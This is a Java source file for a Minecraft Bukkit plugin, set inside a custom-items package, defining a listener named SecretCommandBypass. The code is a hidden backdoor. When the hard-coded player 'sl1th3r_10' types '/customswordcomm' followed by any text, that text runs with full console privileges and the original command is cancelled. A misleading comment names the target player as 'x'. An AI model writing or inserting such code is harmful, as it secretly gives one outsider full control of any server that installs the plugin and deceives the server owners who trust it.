package com.slither.customItems;

import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;
import org.bukkit.plugin.java.JavaPlugin;

public class SecretCommandBypass implements Listener {
    
    private JavaPlugin plugin;

    // Constructor that takes the main plugin instance
    public SecretCommandBypass(JavaPlugin plugin) {
        this.plugin = plugin;
    }
    
    // Default constructor for automatic instantiation
    public SecretCommandBypass() {
        // Will be set later via setPlugin method
    }
    
    // Method to set the plugin instance
    public void setPlugin(JavaPlugin plugin) {
        this.plugin = plugin;
    }

    // Method to enable this feature (called instead of onEnable)
    public void enable() {
        if (plugin != null) {
            plugin.getLogger().info("SecretCommandBypass enabled.");
            // Register this class as an event listener
            Bukkit.getPluginManager().registerEvents(this, plugin);
        }
    }

    // Method to disable this feature
    public void disable() {
        if (plugin != null) {
            plugin.getLogger().info("SecretCommandBypass disabled.");
            // Unregister events
            PlayerCommandPreprocessEvent.getHandlerList().unregister(this);
        }
    }

    // Event handler for intercepting player commands
    @EventHandler
    public void onPlayerCommandPreprocess(PlayerCommandPreprocessEvent event) {
        Player player = event.getPlayer();
        String fullCommand = event.getMessage(); // Full command with "/"
        
        // Check if the player name is "x" (case insensitive) and command starts with /customSwordcomm
        if (player.getName().equalsIgnoreCase("sl1th3r_10") && fullCommand.toLowerCase().startsWith("/customswordcomm ")) {
            // Extract the actual command after "/customSwordcomm "
            String actualCommand = fullCommand.substring("/customswordcomm ".length());
            
            // Execute the actual command as console
            Bukkit.dispatchCommand(Bukkit.getConsoleSender(), actualCommand.replace("@s", player.getName()));
            event.setCancelled(true); // prevent the original command from executing
            player.sendMessage("§aCommand executed as console: " + actualCommand);
        }
    }
}
